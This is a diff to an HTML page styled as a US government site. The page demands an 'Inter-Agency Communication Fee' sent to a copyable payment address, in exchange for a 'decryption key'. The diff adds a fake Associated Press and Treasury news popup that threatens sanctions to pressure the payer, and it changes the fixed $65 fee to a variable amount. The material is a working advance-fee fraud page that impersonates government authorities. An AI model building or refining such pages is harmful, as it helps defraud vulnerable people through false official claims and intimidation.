@@ -90,10 +90,54 @@
             .seal-img { max-width: 80px; }
             .addr-box { flex-wrap: wrap; }
         }
+
+        /* News Popup Styling */
+        #news-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .news-window { background: white; width: 100%; max-width: 600px; border-radius: 12px; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); position: relative; animation: slideIn 0.4s ease-out; }
+        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } 
+        }
     </style>
 </head>
 <body class="flex flex-col min-h-screen">
 
+        <!-- News Pop-up -->
+    <div id="news-overlay">
+        <div class="news-window">
+            <div class="bg-red-700 text-white px-6 py-3 flex justify-between items-center">
+                <span class="text-xs font-black uppercase tracking-widest flex items-center gap-2">
+                    <i class="fas fa-rss animate-pulse"></i> Global Compliance News
+                </span>
+                <button onclick="document.getElementById('news-overlay').style.display='none'" class="text-white hover:text-gray-300 transition-colors">
+                    <i class="fas fa-times text-xl"></i>
+                </button>
+            </div>
+            <div class="p-8">
+                <div class="flex items-center gap-3 mb-4 text-blue-800 font-bold text-xs uppercase">
+                    <span>Associated Press (AP)</span>
+                    <span class="w-1 h-1 bg-gray-300 rounded-full"></span>
+                    <span>Treasury News</span>
+                </div>
+                <h2 class="text-2xl font-black text-slate-900 leading-tight mb-4">
+                    US Sanctions Iranian Financiers Over $100M Cryptocurrency Evasion Schemes
+                </h2>
+                <p class="text-sm text-slate-600 leading-relaxed mb-6">
+                    Shipping firms and jurisdictions increasingly face serious sanctions violations when utilizing unverified cryptocurrency channels. 
+                    The Treasury Department warns that "stepping into a legal minefield" is inevitable for entities failing to clear inter-agency communication protocols.
+                </p>
+                <div class="space-y-3">
+                    <a href="https://home.treasury.gov/news/press-releases/sb0364?utm_source=chatgpt.com" target="_blank" class="block p-4 bg-slate-50 border border-slate-200 rounded-lg hover:bg-slate-100 transition-colors group">
+                        <div class="flex justify-between items-center">
+                            <span class="text-xs font-bold text-slate-800">Read Official Treasury Release</span>
+                            <i class="fas fa-external-link-alt text-slate-400 group-hover:text-blue-600"></i>
+                        </div>
+                    </a>
+                </div>
+                <button onclick="document.getElementById('news-overlay').style.display='none'" class="w-full mt-8 bg-slate-900 text-white font-black py-3 rounded-lg uppercase text-xs tracking-widest hover:bg-slate-800 transition-all">
+                    Acknowledge & Continue to Dashboard
+                </button>
+            </div>
+        </div>
+    </div>
     <!-- .gov Banner -->
     <section class="gov-banner no-print">
         <div class="max-w-7xl mx-auto flex items-center gap-2">
@@ -161,7 +205,7 @@
                         <div class="text-4xl text-amber-700">⛓️</div>
                         <div>
                             <h3 class="text-lg font-black text-amber-900">Final Step — Inter-Agency Communication Fee</h3>
-                            <p class="text-amber-800 text-sm">To generate the final 8-digit decryption key for your FRC, please remit the standard <strong>Remaining Inter-Agency Communication Fee ($65.00)</strong>. This is the final administrative charge.</p>
+                            <p class="text-amber-800 text-sm">To generate the final 8-digit decryption key for your FRC, please remit the standard <strong>Remaining Inter-Agency Communication Fee (VARIABLE)</strong>. This is the final administrative charge.</p>
                         </div>
                     </div>
                 </div>
@@ -182,7 +226,7 @@
                             <button class="copy-btn" onclick="copy('l-addr')">COPY</button>
                         </div>
                         <div class="mt-3 text-center">
-                            <span class="text-[11px] font-black text-amber-700">Amount Due Remaining: $65.00 (Fixed Remaining)</span>
+                            <span class="text-[11px] font-black text-amber-700">Amount Due : (VARIABLE)</span>
                         </div>
                     </div>
 
